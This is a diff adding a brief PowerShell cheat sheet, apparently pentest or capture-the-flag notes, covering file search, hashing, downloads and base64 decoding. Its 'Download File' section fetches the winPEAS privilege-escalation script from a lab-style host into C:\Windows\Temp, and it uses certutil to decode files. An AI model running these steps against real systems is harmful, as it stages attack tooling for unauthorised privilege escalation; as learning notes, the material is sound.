@@ -1,0 +1,31 @@
+---
+title: Powershell
+description:  Commonly used Powershell commands, tips and tricks.
+---
+
+## The Basics
+
+### Get-Command 
+Gets all the cmdlets installed on the current Computer and allows for pattern matching with the following:
+```powershell
+Get-Command Verb-* or Get-Command *-Noun
+```
+### Find, read, and get hash of a file
+```powershell
+Get-ChildItem -Path C:\ -Include *interesting-file.txt* -File -Recurse -ErrorAction SilentlyContinue
+Get-Content "C:\Program Files\interesting-file.txt.txt"
+Get-FileHash -Path "C:\Program Files\interesting-file.txt.txt" -Algorithm MD5
+Get-Location is the same as "Print Working Directory"
+```
+### Download File
+```powershell
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.57.139:8000/winPEAS.bat','winPEAS.bat')"
+powershell -c "Invoke-WebRequest -Uri 'http://10.6.57.139:80/winPEAS.bat' -OutFile 'C:\Windows\Temp\winpeas.bat'"
+```
+### Decode Text
+```powershell
+Get-ChildItem -Path C:/ -Include b64.txt -Recurse -File
+certutil -decode "C:\Users\Administrator\Desktop\b64.txt" decode.txt
+Get-Content .\decode.txt
+```
+
